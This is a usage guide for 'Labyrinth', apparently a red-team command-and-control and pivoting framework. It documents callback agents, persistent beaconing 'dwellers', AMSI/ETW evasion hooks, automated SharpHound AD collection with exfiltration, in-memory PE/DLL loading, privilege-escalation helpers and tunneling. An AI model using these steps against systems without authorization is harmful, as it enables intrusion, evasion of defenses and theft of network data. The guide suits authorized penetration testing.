# Usage Guide

This guide describes the current Labyrinth operator workflow, CLI options, and
runtime behavior.

## Binaries

Labyrinth builds four operator-facing binaries:

- `labyrinth-server`: control server and browser visualization host.
- `labyrinth-agent`: outbound client that connects to the server.
- `labyrinth-dweller`: persistent access point that can listen or check in.
- `labyrinth`: compatibility wrapper with `server`, `agent`, and `dweller`
  subcommands.

Release artifacts are generated into `releases/` by `build_release.sh`. That
directory is intentionally ignored by git.

## Server

Basic server:

```bash
sudo LABYRINTH_AUTH_KEY="change-this-secret" \
  ./labyrinth-server \
  --listen-addr 0.0.0.0:44344
```

Local unauthenticated testing only:

```bash
sudo ./labyrinth-server --no-auth
```

Headless mode:

```bash
sudo LABYRINTH_AUTH_KEY="change-this-secret" \
  ./labyrinth-server \
  --headless \
  --listen-addr 0.0.0.0:44344
```

QUIC server:

```bash
sudo LABYRINTH_AUTH_KEY="change-this-secret" \
  ./labyrinth-server \
  --transport quic \
  --listen-addr 0.0.0.0:44344
```

Enable the browser map:

```bash
sudo LABYRINTH_AUTH_KEY="change-this-secret" \
  ./labyrinth-server \
  --gui \
  --web-ui-addr 127.0.0.1:44777
```

Keep browser visualization disabled explicitly:

```bash
sudo LABYRINTH_AUTH_KEY="change-this-secret" \
  ./labyrinth-server \
  --no-web-ui
```

Server options:

| Option | Description |
| --- | --- |
| `--listen-addr <ip:port>` | Server listen address. Defaults to `0.0.0.0:44344`. |
| `--no-auth` | Disable authentication. Use for isolated testing only. |
| `--headless` | Run without the interactive control prompt. |
| `--interface <name>` | Compatibility option for headless tunnel interface naming. |
| `--route <cidr>` | Compatibility option for headless route configuration. |
| `--domain <name>` | Domain used when generating a local TLS certificate. |
| `--transport tcp|quic` | Agent transport. Defaults to `tcp`. |
| `--gui`, `--GUI` | Enable the browser dashboard. Disabled by default. |
| `--web-ui-addr <ip:port>` | Browser dashboard listen address. Defaults to `127.0.0.1:44777`. |
| `--no-web-ui` | Compatibility override that keeps the browser dashboard disabled. |

## Agent

Basic agent:

```bash
LABYRINTH_AUTH_KEY="change-this-secret" \
  ./labyrinth-agent \
  --server SERVER_IP:44344 \
  --fingerprint SHA256_FINGERPRINT
```

Retry on disconnect:

```bash
LABYRINTH_AUTH_KEY="change-this-secret" \
  ./labyrinth-agent \
  --server SERVER_IP:44344 \
  --fingerprint SHA256_FINGERPRINT \
  --retry
```

QUIC agent:

```bash
LABYRINTH_AUTH_KEY="change-this-secret" \
  ./labyrinth-agent \
  --transport quic \
  --server SERVER_IP:44344 \
  --fingerprint SHA256_FINGERPRINT
```

TCP/TLS agent through SOCKS5:

```bash
LABYRINTH_AUTH_KEY="change-this-secret" \
  ./labyrinth-agent \
  --server SERVER_IP:44344 \
  --proxy socks5://127.0.0.1:1080 \
  --fingerprint SHA256_FINGERPRINT
```

Agent options:

| Option | Description |
| --- | --- |
| `--server <ip:port>` | Server address to connect to. |
| `--fingerprint <sha256>` | Accept the server certificate with this SHA-256 fingerprint. |
| `--cert <base64>` | Verify with a base64 encoded server certificate. |
| `--proxy <socks5-url>` | TCP/TLS-only SOCKS5 proxy. |
| `--transport tcp|quic` | Server transport. Defaults to `tcp`. |
| `--retry` | Reconnect after connection failure. |
| `--sni <name>` | Override the TLS or QUIC Server Name Indication value. Defaults to `localhost`. |
| `--alpn <proto[,proto]>` | Override ALPN protocols for the TLS or QUIC handshake. QUIC defaults to `labyrinth-control/1` when unset. |
| `--evasion <amsi|etw|all>` | Windows-only startup hooks. May be comma-delimited. Hooks are not applied unless explicitly requested. |

Agents collect host, operating system, interface, route, and low-noise outbound
reachability data during registration. The server uses that information for
route detection, topology display, and smart access planning.

Transport customization example:

```bash
LABYRINTH_AUTH_KEY="change-this-secret" \
  ./labyrinth-agent \
  --server SERVER_IP:44344 \
  --fingerprint SHA256_FINGERPRINT \
  --sni example.com \
  --alpn h2,http/1.1
```

Windows startup hooks example:

```bash
LABYRINTH_AUTH_KEY="change-this-secret" \
  ./labyrinth-agent \
  --server SERVER_IP:44344 \
  --fingerprint SHA256_FINGERPRINT \
  --evasion amsi,etw
```

`--evasion` accepts `amsi`, `etw`, or `all`. The hooks are isolated in the
agent evasion module, run before registration, and skip with a warning on
non-Windows platforms or unsupported Windows architectures. Hook patching is
implemented for x86_64 and i686 Windows.

## BloodHound Collection

Labyrinth includes an automated workflow for BloodHound data collection using
SharpHound. This feature simplifies Active Directory enumeration by handling
the binary provisioning, execution, and data exfiltration.

To trigger collection on a Windows agent:

1.  Select the target agent in the server CLI.
2.  Type `bloodhound`.

### Workflow Automation

- **Auto-Discovery**: The server checks for `SharpHound.exe` in local directories
  and standard Kali Linux locations (`/usr/share/sharphound/`).
- **Auto-Provisioning**: If the binary is missing, the server automatically
  downloads the latest release from the official SharpHound GitHub repository.
- **Secure Execution**: The binary is uploaded to a temporary location on the
  target, executed with comprehensive flags (`-c All,GPOLocations`), and results
  are retrieved to the `labyrinth-artifacts/` folder.
- **Cleanup**: After successful (or failed) retrieval, the server removes both
  the executable and the generated ZIP from the remote host.

### Shell Integration

You can also trigger collection from within an interactive shell session using
 the `!bloodhound` command.

## Dweller

Dwellers are persistent remembered endpoints. They are useful when a host should
remain available for future access but the operator does not want to keep a
full interactive agent session online at all times.

Inbound listener:

```bash
./labyrinth-dweller \
  --listen 0.0.0.0:45454 \
  --cert-file cert.pem \
  --key-file key.pem \
  --id branch-01 \
  --auth-key "change-this-secret"
```

Callback and hibernation:

```bash
./labyrinth-dweller \
  --listen 0.0.0.0:45454 \
  --cert-file cert.pem \
  --key-file key.pem \
  --id branch-01 \
  --auth-key "change-this-secret" \
  --callback-server SERVER_IP:44344 \
  --callback-fingerprint SHA256_FINGERPRINT \
  --callback-transport tcp \
  --sleep 60 \
  --jitter 50 \
  --task-batch-size 10
```

Dweller options:

| Option | Description |
| --- | --- |
| `--listen <ip:port>` | Inbound listener address. Defaults to `0.0.0.0:45454`. |
| `--cert-file <path>` | TLS certificate PEM path. |
| `--key-file <path>` | TLS private key PEM path. |
| `--id <id>` | Stable dweller identifier. |
| `--name <name>` | Optional display name. |
| `--auth-key <secret>` | Shared secret used by the server and dweller. |
| `--config-file <path>` | Runtime config file for dweller settings. |
| `--callback-server <ip:port>` | Server endpoint the dweller should check in to when reachable. May be repeated. |
| `--callback-fingerprint <sha256>` | Certificate fingerprint for callback server verification. |
| `--callback-transport <name>` | Callback transport label. Current control protocol supports `tcp` and `quic`; `http`, `https`, and `dns` are accepted as planning labels until dedicated listeners are implemented. |
| `--hibernation <bool>` | Enable hibernating task polling. Defaults to `true`. |
| `--sleep <seconds>` | Base sleep interval. Defaults to `60`. |
| `--jitter <percent>` | Jitter percentage, clamped from `0` to `100`. Defaults to `50`. |
| `--task-batch-size <count>` | Maximum queued tasks claimed per check-in. Defaults to `10`. |

Hibernation flow:

```text
sleep with jitter
check in to configured server
claim queued tasks
run tasks
send results
sleep again
```

Use `--hibernation false` when the dweller must keep a long-lived tunnel or
port forward online.

## Interactive Server Commands

| Command | Purpose |
| --- | --- |
| `help` | Show interactive help. |
| `agents` | List connected agents and status. |
| `dwellers` | List remembered dwellers. |
| `select` | Select an agent or connected dweller as the active target. |
| `connect-dweller` | Connect to a remembered inbound dweller. |
| `drop-dweller` | Deploy a dweller through the selected agent. |
| `configure-dweller` | Change callback servers, transport, sleep, jitter, hibernation, and batch size. |
| `task-dweller` | Queue a task for a hibernating dweller. |
| `dweller-tasks` | Show queued tasks and returned results. |
| `forget-dweller` | Remove a remembered dweller record. |
| `info` | Show selected target profile and interfaces. |
| `topology` or `routes` | Show route ownership, shared networks, and conflicts. |
| `plan <ip|cidr>` | Preview the smart access path without changing state. |
| `access <ip|cidr>` | Apply the selected smart access path after confirmation. |
| `chain status` | Show active tunnels, dwellers, and reachability status. |
| `chain doctor [ip|cidr]` | Diagnose why a target or dweller is unreachable. |
| `map` or `network-map` | Show a read-only terminal network graph. |
| `tunnel` or `ariadne` | Start IP tunneling for the selected target. |
| `forward` or `portal` | Start reverse port forwarding. |
| `commands` or `cmd` | Open command workflows and interactive shell modes. |
| `upload` | Upload a file to the selected target. |
| `download` | Download a file from the selected target. |
| `status` | Show server and selected target status. |
| `cert` | Print certificate fingerprint and base64 certificate. |
| `stop` | Stop active tunnel or port forwarding. |
| `clear` | Clear the terminal. |
| `exit` | Shut down the interactive server. |

## Smart Access and Multi-Hop

Labyrinth registration includes interface data, route candidates, observed
dweller parent paths, active tunnel state, and reachability status. The server
uses this to plan access to an IP or CIDR:

```text
labyrinth -> plan 172.16.20.0/24
labyrinth -> access 172.16.20.25
labyrinth -> chain doctor 172.16.20.25
```

`plan` is read-only. `access` confirms before mutating state, reuses active
tunnels when possible, starts required parent Ariadne tunnels, and attempts to
connect remembered dwellers when a parent route makes them reachable.

Example chain:

```text
X server
A public agent
B internal behind A
C internal behind B
```

If C has a remembered dweller path like `C via B via A`, Labyrinth displays
that as operator context. The actual route decision still uses live topology,
active tunnels, and current online state.

## Ariadne Tunneling

Ariadne provides network-level access through a selected agent:

```text
labyrinth -> select
labyrinth -> ariadne
```

The prompt offers the best automatically detected CIDR from the selected
agent's interfaces. You can override it with another CIDR when needed. Ariadne
requires elevated privileges on the server for TUN setup.

## Portal Port Forwarding

Portal forwards a local server-side port to a target reachable from the
selected agent:

```text
labyrinth -> portal
8080:192.168.1.50:80
done
```

For QUIC-connected agents, each proxied connection uses its own QUIC
bidirectional stream.

## Interactive Shells

The `commands` menu offers two shell styles:

- Raw terminal: SSH or WinRM-style PTY streaming with arrows, Ctrl-C,
  PowerShell, full-screen terminal programs, and prompts. Press `Ctrl-]` to
  detach.
- Control shell: line-oriented shell on the same PTY model with local Labyrinth
  commands prefixed by `!`.

Control shell local commands include:

```text
!help
!upload <local> <remote>
!download <remote> <local>
!resize <cols> <rows>
!history
!clear
!sysenum
!network
!network summary
!autoenum
!privesc
!exit
```

The `commands` menu also includes Windows in-memory execution workflows for BOF
and reflective PE/DLL loading. These workflows send typed protocol messages and
store command output under `command_outputs/` like other remote execution
results.

Linux BOF and PE/DLL loading are intentionally rejected because those formats
are Windows-specific. Linux in-memory execution is possible through a separate
ELF loader, such as a memfd-backed executable or shared-object loader, but that
requires different validation, lifecycle, and output-capture behavior.

Slash-prefixed paths and programs are remote input:

```text
/usr/bin/id
/tmp/tool
./relative-script
```

## Browser Visualization

The dashboard is disabled by default. Start the server with `--gui` to enable it on:

```text
http://127.0.0.1:44777
```

It is visualization-only in this version. It shows:

- Server, agent, dweller, network, and port-forward nodes.
- Encrypted transport edges and local or unencrypted edges.
- Active Ariadne tunnels and Portal forwards.
- Shared networks and route conflicts.
- Dweller callback, hibernation, path, task, and reachability context.
- Connection status and update freshness.
- Pan, zoom, fit-to-view, node selection, and smart access suggestions.

Keep the dashboard bound to localhost unless access control is added.

## Troubleshooting

Permission denied while starting Ariadne:

```bash
sudo ./labyrinth-server
```

Connection refused:

```bash
ss -tlnp | grep 44344
./labyrinth-agent --retry --server SERVER_IP:44344 --fingerprint SHA256_FINGERPRINT
```

Certificate verification failed:

```bash
labyrinth -> cert
./labyrinth-agent --server SERVER_IP:44344 --fingerprint EXACT_FINGERPRINT
```

Dashboard unavailable:

```bash
./labyrinth-server --gui --web-ui-addr 127.0.0.1:44777
```

QUIC agent cannot connect:

- Confirm the server is also using `--transport quic`.
- Confirm UDP traffic to the listen port is allowed.
- Do not use `--proxy`; SOCKS mode is TCP/TLS-only.

Route or dweller unreachable:

```text
labyrinth -> topology
labyrinth -> chain status
labyrinth -> chain doctor TARGET_IP_OR_CIDR
```
